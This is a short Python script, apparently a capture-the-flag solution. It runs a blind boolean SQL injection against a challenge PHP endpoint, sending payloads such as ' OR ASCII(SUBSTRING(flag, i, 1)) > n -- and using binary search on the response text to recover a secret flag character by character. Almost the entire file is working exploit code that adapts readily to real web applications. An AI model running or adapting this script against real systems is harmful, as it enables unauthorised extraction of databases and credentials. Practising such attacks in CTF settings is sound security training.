#!/usr/bin/python3
# -*- encoding: utf-8 -*-
import requests

URL = "https://unitedctf.ca:18000/challenge3.php"
HEADERS = {}

query = "' OR ASCII(SUBSTRING(flag, {}, 1)) > {} -- " # Placeholders are for Position and ascii value respectively
validate = "' OR flag='{}"

def find_next_letter(index):
    resp = requests.Response()
    low = 0
    high = 0x7f # Maximum value in ASCII range

    # Use binary search over the ASCII range. Faster than enumerating each character
    while high > low:
        char = (low + high) // 2
        try:
            resp = requests.post(URL, data={"flagID": query.format(index, char)}, headers=HEADERS)
        except ConnectionError as e:
            print(e)
        if "au moins un résultat" in resp.text:
            low = char + 1
        else:
            high = char
    return chr(low)

def find_password():
    currentPass = ""
    while "au moins un résultat" not in requests.post(URL, data={"flagID": validate.format(currentPass)}, headers=HEADERS).text:
        currentPass += find_next_letter(len(currentPass) + 1) #SUBSTRING is 1-indexed
        print(currentPass)
    return currentPass

print("Flag: " + find_password())
